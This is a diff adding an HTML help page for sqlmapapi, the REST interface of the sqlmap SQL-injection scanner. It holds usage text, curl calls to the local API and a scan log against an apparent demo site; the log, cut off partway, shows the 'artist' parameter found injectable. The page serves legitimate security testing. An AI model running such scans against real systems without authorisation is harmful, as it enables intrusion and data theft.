@@ -1,0 +1,494 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>sqlmapapi</title>
+</head><body>API (REST-JSON)<br/>
+<br/>
+sqlmap can be run through the REST-JSON API, API (abbr. for Application Program Interface) that uses JSON for REST (abbr. for REpresentational State Transfer) communication between server and client instance(s). In plainspeak, server runs the sqlmap scan(s), while clients are setting the sqlmap options/switches and pull the results back. Main program file for running the API is sqlmapapi.py, while the client can also be implemented inside the arbitrary user program.<br/>
+<br/>
+$ python sqlmapapi.py -hh<br/>
+Usage: sqlmapapi.py [options]<br/>
+<br/>
+Options:<br/>
+&nbsp; -h, --help &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;show this help message and exit<br/>
+&nbsp; -s, --server &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Act as a REST-JSON API server<br/>
+&nbsp; -c, --client &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Act as a REST-JSON API client<br/>
+&nbsp; -H HOST, --host=HOST &nbsp;Host of the REST-JSON API server (default "127.0.0.1")<br/>
+&nbsp; -p PORT, --port=PORT &nbsp;Port of the the REST-JSON API server (default 8775)<br/>
+&nbsp; --adapter=ADAPTER &nbsp; &nbsp; Server (bottle) adapter to use (default "wsgiref")<br/>
+<br/>
+Server runs the sqlmapapi.py by using switch -s, client by using switch -c, while in both cases user can (optionally) set listening IP address with option -H (default "127.0.0.1") and listening port with option -p (default 8775). Each client's "session" can have multiple "tasks" (i.e. sqlmap scan runs), where user can arbitrary choose which task should be currently active.<br/>
+<br/>
+<b>Inside the client's command line interface available commands are:</b><br/>
+<br/>
+&nbsp; &nbsp; help - showing list of available commands along with basic help information<br/>
+&nbsp; &nbsp; new ARGS - starts a new scan task with provided arguments (e.g. new -u "http://testphp.vulnweb.com/artists.php?artist=1")<br/>
+&nbsp; &nbsp; use TASKID - switches current context to different task (e.g. use c04d8c5c7582efb4)<br/>
+&nbsp; &nbsp; data - retrieves and shows data for current task<br/>
+&nbsp; &nbsp; log- retrieves and shows log for current task<br/>
+&nbsp; &nbsp; status - retrieves and shows status for current task<br/>
+&nbsp; &nbsp; stop - stops current task<br/>
+&nbsp; &nbsp; kill - kills current task<br/>
+&nbsp; &nbsp; list - displays all tasks (for current session)<br/>
+&nbsp; &nbsp; flush - flushes (i.e. deletes) all tasks<br/>
+&nbsp; &nbsp; exit - exits the client interface<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<b>Example server run:</b><br/>
+<br/>
+$ python sqlmapapi.py -s -H "0.0.0.0"<br/>
+[12:47:51] [INFO] Running REST-JSON API server at '0.0.0.0:8775'..<br/>
+[12:47:51] [INFO] Admin ID: 89fd118997840a9bd7fc329ab535b881<br/>
+[12:47:51] [DEBUG] IPC database: /tmp/sqlmapipc-SzBQnd<br/>
+[12:47:51] [DEBUG] REST-JSON API server connected to IPC database<br/>
+[12:47:51] [DEBUG] Using adapter 'wsgiref' to run bottle<br/>
+[12:48:10] [DEBUG] Created new task: 'a42ddaef02e976f0'<br/>
+[12:48:10] [DEBUG] [a42ddaef02e976f0] Started scan<br/>
+[12:48:16] [DEBUG] [a42ddaef02e976f0] Retrieved scan status<br/>
+[12:48:50] [DEBUG] [a42ddaef02e976f0] Retrieved scan status<br/>
+[12:48:55] [DEBUG] [a42ddaef02e976f0] Retrieved scan log messages<br/>
+[12:48:59] [DEBUG] [a42ddaef02e976f0] Retrieved scan data and error messages<br/>
+<br/>
+<b>Example client run:</b><br/>
+<br/>
+$ python sqlmapapi.py -c -H "192.168.110.1"<br/>
+[12:47:53] [DEBUG] Example client access from command line:<br/>
+&nbsp; &nbsp; $ taskid=$(curl http://192.168.110.1:8775/task/new 2&gt;1 | grep -o -I '[a-f0-9<br/>
+]\{16\}') &amp;&amp; echo $taskid<br/>
+&nbsp; &nbsp; $ curl -H "Content-Type: application/json" -X POST -d '{"url": "http://testp<br/>
+hp.vulnweb.com/artists.php?artist=1"}' http://192.168.110.1:8775/scan/$taskid/st<br/>
+art<br/>
+&nbsp; &nbsp; $ curl http://192.168.110.1:8775/scan/$taskid/data<br/>
+&nbsp; &nbsp; $ curl http://192.168.110.1:8775/scan/$taskid/log<br/>
+[12:47:53] [INFO] Starting REST-JSON API client to 'http://192.168.110.1:8775'..<br/>
+.<br/>
+[12:47:53] [DEBUG] Calling http://192.168.110.1:8775<br/>
+[12:47:53] [INFO] Type 'help' or '?' for list of available commands<br/>
+api&gt; ?<br/>
+help &nbsp; &nbsp; &nbsp; &nbsp;Show this help message<br/>
+new ARGS &nbsp; &nbsp;Start a new scan task with provided arguments (e.g. 'new -u "http://<br/>
+testphp.vulnweb.com/artists.php?artist=1"')<br/>
+use TASKID &nbsp;Switch current context to different task (e.g. 'use c04d8c5c7582efb4<br/>
+')<br/>
+data &nbsp; &nbsp; &nbsp; &nbsp;Retrieve and show data for current task<br/>
+log &nbsp; &nbsp; &nbsp; &nbsp; Retrieve and show log for current task<br/>
+status &nbsp; &nbsp; &nbsp;Retrieve and show status for current task<br/>
+stop &nbsp; &nbsp; &nbsp; &nbsp;Stop current task<br/>
+kill &nbsp; &nbsp; &nbsp; &nbsp;Kill current task<br/>
+list &nbsp; &nbsp; &nbsp; &nbsp;Display all tasks<br/>
+flush &nbsp; &nbsp; &nbsp; Flush tasks (delete all tasks)<br/>
+exit &nbsp; &nbsp; &nbsp; &nbsp;Exit this client<br/>
+<br/>
+<br/>
+api&gt; new -u "http://testphp.vulnweb.com/artists.php?artist=1" --banner --flush-s<br/>
+ession<br/>
+[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/task/new<br/>
+[12:48:10] [INFO] New task ID is 'a42ddaef02e976f0'<br/>
+[12:48:10] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/start<br/>
+[12:48:10] [INFO] Scanning started<br/>
+api (a42ddaef02e976f0)&gt; status<br/>
+[12:48:16] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu<br/>
+s<br/>
+{<br/>
+&nbsp; &nbsp; "status": "running", <br/>
+&nbsp; &nbsp; "returncode": null, <br/>
+&nbsp; &nbsp; "success": true<br/>
+}<br/>
+api (a42ddaef02e976f0)&gt; status<br/>
+[12:48:50] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/statu<br/>
+s<br/>
+{<br/>
+&nbsp; &nbsp; "status": "terminated", <br/>
+&nbsp; &nbsp; "returncode": 0, <br/>
+&nbsp; &nbsp; "success": true<br/>
+}<br/>
+api (a42ddaef02e976f0)&gt; log<br/>
+[12:48:55] [DEBUG] Calling http://192.168.110.1:8775/scan/a42ddaef02e976f0/log<br/>
+{<br/>
+&nbsp; &nbsp; "log": [<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "flushing session file", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:10"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing connection to the target URL", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:10"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "checking if the target is protected by some kind of WAF/<br/>
+IPS", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:10"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing if the target URL is stable", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:10"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "target URL is stable", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:11"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing if GET parameter 'artist' is dynamic", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:11"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "confirming that GET parameter 'artist' is dynamic", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:11"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "GET parameter 'artist' is dynamic", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:11"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "heuristic (basic) test shows that GET parameter 'artist'<br/>
+&nbsp;might be injectable (possible DBMS: 'MySQL')", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:11"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing for SQL injection on GET parameter 'artist'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:11"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'AND boolean-based blind - WHERE or HAVING claus<br/>
+e'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:11"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "GET parameter 'artist' appears to be 'AND boolean-based <br/>
+blind - WHERE or HAVING clause' injectable (with --string=\"hac\")", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, O<br/>
+RDER BY or GROUP BY clause (BIGINT UNSIGNED)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.5 OR error-based - WHERE, HAVING cla<br/>
+use (BIGINT UNSIGNED)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, O<br/>
+RDER BY or GROUP BY clause (EXP)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.5 OR error-based - WHERE, HAVING cla<br/>
+use (EXP)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.7.8 AND error-based - WHERE, HAVING,<br/>
+&nbsp;ORDER BY or GROUP BY clause (JSON_KEYS)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.7.8 OR error-based - WHERE, HAVING c<br/>
+lause (JSON_KEYS)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, O<br/>
+RDER BY or GROUP BY clause (FLOOR)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, OR<br/>
+DER BY or GROUP BY clause (FLOOR)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, O<br/>
+RDER BY or GROUP BY clause (EXTRACTVALUE)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, OR<br/>
+DER BY or GROUP BY clause (EXTRACTVALUE)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, O<br/>
+RDER BY or GROUP BY clause (UPDATEXML)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.1 OR error-based - WHERE, HAVING, OR<br/>
+DER BY or GROUP BY clause (UPDATEXML)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 4.1 AND error-based - WHERE, HAVING, O<br/>
+RDER BY or GROUP BY clause (FLOOR)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 4.1 OR error-based - WHERE, HAVING cla<br/>
+use (FLOOR)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL OR error-based - WHERE or HAVING clause (<br/>
+FLOOR)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (E<br/>
+XTRACTVALUE)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.5 error-based - Parameter replace (B<br/>
+IGINT UNSIGNED)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.5 error-based - Parameter replace (E<br/>
+XP)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.7.8 error-based - Parameter replace <br/>
+(JSON_KEYS)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:12"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.0 error-based - Parameter replace (F<br/>
+LOOR)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.1 error-based - Parameter replace (U<br/>
+PDATEXML)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.1 error-based - Parameter replace (E<br/>
+XTRACTVALUE)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL inline queries'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt; 5.0.11 stacked queries (comment)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt; 5.0.11 stacked queries'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt; 5.0.11 stacked queries (query SLEEP - c<br/>
+omment)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt; 5.0.11 stacked queries (query SLEEP)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &lt; 5.0.12 stacked queries (heavy query - c<br/>
+omment)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &lt; 5.0.12 stacked queries (heavy query)'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'MySQL &gt;= 5.0.12 AND time-based blind'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:13"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "GET parameter 'artist' appears to be 'MySQL &gt;= 5.0.12 AN<br/>
+D time-based blind' injectable ", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:23"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "testing 'Generic UNION query (NULL) - 1 to 20 columns'", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:23"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "message": "automatically extending ranges for UNION query injection<br/>
+&nbsp;technique tests as there is at least one other (potential) technique found", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "level": "INFO", <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "time": "12:48:23"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; }, <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; {<br/>
